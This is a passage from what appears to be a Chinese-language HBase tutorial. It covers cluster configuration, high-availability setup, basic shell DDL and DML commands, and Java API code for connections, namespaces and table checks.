class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102,hadoop103,hadoop104<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>The directory shared by RegionServers.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  &lt;property&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  &lt;name&gt;hbase.zookeeper.property.dataDir&lt;/name&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  &lt;value&gt;/export/zookeeper&lt;/value&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  &lt;description&gt; 记得修改 ZK 的配置文件 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  ZK 的信息不能保存到临时文件夹--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  &lt;/description&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  &lt;/property&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.rootdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hadoop102:8020/hbase<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>The directory shared by RegionServers.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.cluster.distributed<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改regionservers，类似hadoop的workers</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br></pre></td></tr></table></figure><p>最后解决 HBase 和 Hadoop 的 log4j 兼容性问题，修改 HBase 的 jar 包，使用 Hadoop 的 jar 包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /opt/module/hbase/lib/client-facing-thirdparty/slf4j-reload4j-1.7.33.jar /opt/module/hbase/lib/client-facing-thirdparty/slf4j-reload4j-1.7.33.jar.bak</span><br></pre></td></tr></table></figure><h3 id="1-3-分发与启动">1.3 分发与启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分发hbase配置文件</span></span><br><span class="line">xsync /opt/module/hbase/</span><br><span class="line"><span class="comment"># HBase 服务的启动</span></span><br><span class="line">bin/hbase-daemon.sh start master</span><br><span class="line">bin/hbase-daemon.sh start regionserver</span><br><span class="line"><span class="comment"># 群启</span></span><br><span class="line">bin/start-hbase.sh</span><br><span class="line">bin/stop-hbase.sh</span><br><span class="line"><span class="comment"># 启动成功后，可以通过“host:port”的方式来访问 HBase 管理页面</span></span><br><span class="line"><span class="comment"># http://hadoop102:16010</span></span><br></pre></td></tr></table></figure><h3 id="1-4-高可用-可选，推荐">1.4 高可用(可选，推荐)</h3><p>在 HBase 中 HMaster 负责监控 HRegionServer 的生命周期，均衡 RegionServer 的负载， 如果HMaster 挂掉了，那么整个 HBase 集群将陷入不健康的状态，并且此时的工作状态并不会维持太久。所以HBase 支持对 HMaster 的高可用配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭 HBase 集群（如果没有开启则跳过此步）</span></span><br><span class="line">bin/stop-hbase.sh</span><br><span class="line"><span class="comment"># 在 conf 目录下创建 backup-masters 文件</span></span><br><span class="line">touch conf/backup-masters</span><br><span class="line"><span class="comment"># 在 backup-masters 文件中配置高可用 HMaster 节点,注意可以写多个</span></span><br><span class="line"><span class="built_in">echo</span> hadoop103 &gt; conf/backup-masters</span><br><span class="line"><span class="comment"># 将整个 conf 目录 scp 到其他节点</span></span><br><span class="line">xsync conf</span><br><span class="line"><span class="comment"># 重启 hbase,打开页面测试查看</span></span><br><span class="line">bin/start-hbase.sh</span><br><span class="line">bin/stop-hbase.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 宕机机器开启，但也只会变成backup，注意，如果要停止的话需要进入master那台机器停止，因为backup没有集群信息</span></span><br><span class="line">bin/hbase-daemon.sh start master</span><br></pre></td></tr></table></figure><h2 id="2、HBase-Shell-基本操作">2、HBase Shell 基本操作</h2><h3 id="2-1-基本操作">2.1 基本操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入 HBase 客户端命令行</span></span><br><span class="line">bin/hbase shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看帮助命令</span></span><br><span class="line"><span class="comment"># 能够展示 HBase 中所有能使用的命令，主要使用的命令有 namespace 命令空间相关，DDL 创建修改表格，DML 写入读取数据</span></span><br><span class="line">hbase:001:0&gt; <span class="built_in">help</span></span><br><span class="line"><span class="comment"># namespace</span></span><br><span class="line"><span class="comment"># 创建命名空间</span></span><br><span class="line">hbase:002:0&gt; <span class="built_in">help</span> <span class="string">'create_namespace'</span></span><br><span class="line"><span class="comment"># 创建命名空间 bigdata</span></span><br><span class="line">hbase:003:0&gt; create_namespace <span class="string">'bigdata'</span></span><br><span class="line"><span class="comment"># 查看所有的命名空间</span></span><br><span class="line">hbase:004:0&gt; list_namespace</span><br></pre></td></tr></table></figure><h3 id="2-2-DDL">2.2 DDL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># DDL</span></span><br><span class="line"><span class="comment"># 创建表</span></span><br><span class="line"><span class="comment"># 在 bigdata 命名空间中创建表格 student，两个列族。info 列族数据维护的版本数为 5 个，如果不写默认版本数为 1</span></span><br><span class="line">hbase:005:0&gt; create <span class="string">'bigdata:student'</span>, &#123;NAME =&gt; <span class="string">'info'</span>, VERSIONS =&gt; 5&#125;, &#123;NAME =&gt; <span class="string">'msg'</span>&#125;</span><br><span class="line"><span class="comment"># 如果创建表格只有一个列族，没有列族属性，可以简写</span></span><br><span class="line"><span class="comment"># 如果不写命名空间，使用默认的命名空间 default</span></span><br><span class="line">hbase:009:0&gt; create <span class="string">'student1'</span>,<span class="string">'info'</span></span><br><span class="line"><span class="comment"># 查看表</span></span><br><span class="line"><span class="comment"># 查看表有两个命令：list 和 describe</span></span><br><span class="line">hbase:013:0&gt; list</span><br><span class="line"><span class="comment"># describe：查看一个表的详情</span></span><br><span class="line">hbase:014:0&gt; describe <span class="string">'student1'</span></span><br><span class="line"><span class="comment"># 修改表</span></span><br><span class="line"><span class="comment"># 表名创建时写的所有和列族相关的信息，都可以后续通过 alter 修改，包括增加删除列族</span></span><br><span class="line"><span class="comment"># 增加列族和修改信息都使用覆盖的方法</span></span><br><span class="line">hbase:015:0&gt; alter <span class="string">'student1'</span>, &#123;NAME =&gt; <span class="string">'f1'</span>, VERSIONS =&gt; 3&#125;</span><br><span class="line"><span class="comment"># 删除信息使用特殊的语法</span></span><br><span class="line">hbase:015:0&gt; alter <span class="string">'student1'</span>, NAME =&gt; <span class="string">'f1'</span>, METHOD =&gt; <span class="string">'delete'</span></span><br><span class="line">hbase:016:0&gt; alter <span class="string">'student1'</span>, <span class="string">'delete'</span> =&gt; <span class="string">'f1'</span></span><br><span class="line"><span class="comment"># 删除表</span></span><br><span class="line"><span class="comment"># shell 中删除表格,需要先将表格状态设置为不可用</span></span><br><span class="line">hbase:017:0&gt; <span class="built_in">disable</span> <span class="string">'student1'</span></span><br><span class="line">hbase:018:0&gt; drop <span class="string">'student1'</span></span><br></pre></td></tr></table></figure><h3 id="2-3-DML">2.3 DML</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># DML</span></span><br><span class="line"><span class="comment"># 写入数据</span></span><br><span class="line"><span class="comment"># 在 HBase 中如果想要写入数据，只能添加结构中最底层的 cell。可以手动写入时间戳指定 cell 的版本，推荐不写默认使用当前的系统时间。</span></span><br><span class="line">hbase:019:0&gt; put <span class="string">'bigdata:student'</span>,<span class="string">'1001'</span>,<span class="string">'info:name'</span>,<span class="string">'zhangsan'</span></span><br><span class="line">hbase:020:0&gt; put <span class="string">'bigdata:student'</span>,<span class="string">'1001'</span>,<span class="string">'info:name'</span>,<span class="string">'lisi'</span></span><br><span class="line">hbase:021:0&gt; put <span class="string">'bigdata:student'</span>,<span class="string">'1001'</span>,<span class="string">'info:age'</span>,<span class="string">'18'</span></span><br><span class="line"><span class="comment"># 如果重复写入相同 rowKey，相同列的数据，会写入多个版本进行覆盖</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取数据</span></span><br><span class="line"><span class="comment"># 读取数据的方法有两个：get 和 scan</span></span><br><span class="line"><span class="comment"># get 最大范围是一行数据，也可以进行列的过滤，读取数据的结果为多行 cell</span></span><br><span class="line">hbase:022:0&gt; get <span class="string">'bigdata:student'</span>,<span class="string">'1001'</span></span><br><span class="line">hbase:023:0&gt; get <span class="string">'bigdata:student'</span>,<span class="string">'1001'</span> , &#123;COLUMN =&gt; <span class="string">'info:name'</span>&#125;</span><br><span class="line"><span class="comment"># 也可以修改读取 cell 的版本数，默认读取一个。最多能够读取当前列族设置的维护版本数</span></span><br><span class="line">hbase:024:0&gt;get <span class="string">'bigdata:student'</span>,<span class="string">'1001'</span> , &#123;COLUMN =&gt; <span class="string">'info:name'</span>, VERSIONS =&gt; 6&#125;</span><br><span class="line"><span class="comment"># scan 是扫描数据，能够读取多行数据，不建议扫描过多的数据，推荐使用 startRow 和stopRow 来控制读取的数据，默认范围左闭右开</span></span><br><span class="line">hbase:025:0&gt; scan <span class="string">'bigdata:student'</span>,&#123;STARTROW =&gt; <span class="string">'1001'</span>,STOPROW =&gt; <span class="string">'1002'</span>&#125;</span><br><span class="line"><span class="comment"># 实际开发中使用 shell 的机会不多，所有丰富的使用方法到 API 中介绍</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除数据</span></span><br><span class="line"><span class="comment"># 删除数据的方法有两个：delete 和 deleteall</span></span><br><span class="line"><span class="comment"># delete 表示删除一个版本的数据，即为 1 个 cell，不填写版本默认删除最新的一个版本</span></span><br><span class="line">hbase:026:0&gt; delete <span class="string">'bigdata:student'</span>,<span class="string">'1001'</span>,<span class="string">'info:name'</span></span><br><span class="line"><span class="comment"># deleteall 表示删除所有版本的数据，即为当前行当前列的多个 cell。（执行命令会标记数据为要删除，不会直接将数据彻底删除，删除数据只在特定时期清理磁盘时进行）</span></span><br><span class="line">hbase:027:0&gt; deleteall <span class="string">'bigdata:student'</span>,<span class="string">'1001'</span>,<span class="string">'info:name'</span></span><br></pre></td></tr></table></figure><h3 id="2-4-其他">2.4 其他</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示服务器状态</span></span><br><span class="line">status <span class="string">'node01'</span></span><br><span class="line"><span class="comment"># whoami显示 HBase 当前用户</span></span><br><span class="line">whoami</span><br><span class="line"><span class="comment"># 显示当前所有的表</span></span><br><span class="line">list</span><br><span class="line"><span class="comment"># 统计指定表的记录数</span></span><br><span class="line">count <span class="string">'user'</span></span><br><span class="line"><span class="comment"># 展示表结构信息</span></span><br><span class="line">describe <span class="string">'user'</span></span><br><span class="line"><span class="comment"># 检查表是否存在，适用于表量特别多的情况</span></span><br><span class="line">exists <span class="string">'user'</span></span><br><span class="line"><span class="comment"># 检查表是否启用或禁用:is_enabled、is_disabled</span></span><br><span class="line">is_enabled <span class="string">'user'</span></span><br><span class="line"><span class="comment"># truncate清空表</span></span><br></pre></td></tr></table></figure><h1>三、HBase API</h1><p>代码较为底层，一般二次开发jar包引入使用</p><h2 id="1、环境准备与连接">1、环境准备与连接</h2><h3 id="1-1-环境准备">1.1 环境准备</h3><p> 新建项目后在 pom.xml 中添加依赖，注意：会报错 javax.el 包不存在，是一个测试用的依赖，不影响使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hbase<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hbase-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.glassfish<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.glassfish<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1-b06<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-单线程连接">1.2 单线程连接</h3><p>HBase 的客户端连接由 ConnectionFactory 类来创建，用户使用完成之后需要手动关闭连接。同时连接是一个重量级的，推荐一个进程使用一个连接，对 HBase 的命令通过连接中的两个属性 Admin 和 Table 来实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HBaseConnect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 1. 创建配置对象</span></span><br><span class="line">        Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">        <span class="comment">// 2. 添加配置参数</span></span><br><span class="line">        conf.set(<span class="string">"hbase.zookeeper.quorum"</span>, <span class="string">"hadoop102,hadoop103,hadoop104"</span>);</span><br><span class="line">        <span class="comment">// 3. 创建 hbase 的连接</span></span><br><span class="line">        <span class="comment">// 默认使用同步连接</span></span><br><span class="line">        Connection connection =</span><br><span class="line">                ConnectionFactory.createConnection(conf);</span><br><span class="line">        <span class="comment">// 可以使用异步连接</span></span><br><span class="line">        <span class="comment">// 主要影响后续的 DML 操作</span></span><br><span class="line">        CompletableFuture&lt;AsyncConnection&gt; asyncConnection =</span><br><span class="line">                ConnectionFactory.createAsyncConnection(conf);</span><br><span class="line">        <span class="comment">// 4. 使用连接</span></span><br><span class="line">        System.out.println(connection);</span><br><span class="line">        <span class="comment">// 5. 关闭连接</span></span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-3-多线程创建连接-推荐">1.3 多线程创建连接(推荐)</h3><p>使用类单例模式,确保使用一个连接，可以同时用于多个线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HBaseConnect</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置静态属性 hbase 连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection connection = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 创建 hbase 的连接</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用配置文件的方法</span></span><br><span class="line">            connection = ConnectionFactory.createConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">"连接获取失败"</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 连接关闭方法,用于进程关闭时调用</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">closeConnection</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (connection != <span class="keyword">null</span>) &#123;</span><br><span class="line">            connection.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 resources 文件夹中创建配置文件 hbase-site.xml，添加以下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102,hadoop103,hadoop104<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2、DDL">2、DDL</h2><p>创建 HBaseDDL 类，添加静态方法即可作为工具类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HBaseDDL</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 添加静态属性 connection 指向单例连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection connection = HBaseConnect.connection;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-创建命名空间">2.1 创建命名空间</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建命名空间</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> namespace 命名空间名称</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createNamespace</span><span class="params">(String namespace)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">        IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取 admin</span></span><br><span class="line">    <span class="comment">// 此处的异常先不要抛出 等待方法写完 再统一进行处理</span></span><br><span class="line">    <span class="comment">// admin 的连接是轻量级的 不是线程安全的 不推荐池化或者缓存这个连接</span></span><br><span class="line">    Admin admin = connection.getAdmin();</span><br><span class="line">    <span class="comment">// 2. 调用方法创建命名空间</span></span><br><span class="line">    <span class="comment">// 代码相对 shell 更加底层 所以 shell 能够实现的功能 代码一定能实现</span></span><br><span class="line">    <span class="comment">// 所以需要填写完整的命名空间描述</span></span><br><span class="line">    <span class="comment">// 2.1 创建命令空间描述建造者 =&gt; 设计师</span></span><br><span class="line">    NamespaceDescriptor.Builder builder =</span><br><span class="line">            NamespaceDescriptor.create(namespace);</span><br><span class="line">    <span class="comment">// 2.2 给命令空间添加需求</span></span><br><span class="line">    builder.addConfiguration(<span class="string">"user"</span>, <span class="string">"atguigu"</span>);</span><br><span class="line">    <span class="comment">// 2.3 使用 builder 构造出对应的添加完参数的对象 完成创建</span></span><br><span class="line">    <span class="comment">// 创建命名空间出现的问题 都属于本方法自身的问题 不应该抛出</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        admin.createNamespace(builder.build());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        System.out.println(<span class="string">"命令空间已经存在"</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 关闭 admin</span></span><br><span class="line">    admin.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-判断表格是否存在">2.2 判断表格是否存在</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断表格是否存在</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> namespace 命名空间名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> tableName 表格名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> ture 表示存在</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isTableExists</span><span class="params">(String namespace,String</span></span></span><br><span class="line"><span class="function"><span class="params">        tableName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取 admin</span></span><br><span class="line">    Admin admin = connection.getAdmin();</span><br><span class="line">    <span class="comment">// 2. 使用方法判断表格是否存在</span></span><br><span class="line">    <span class="keyword">boolean</span> b = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        b = admin.tableExists(TableName.valueOf(namespace, tableName));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 关闭 admin</span></span><br><span class="line">    admin.close();</span><br><span class="line">    <span class="comment">// 3. 返回结果</span></span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">    <span class="comment">// 后面的代码不能生效</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-创建表">2.3 创建表</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 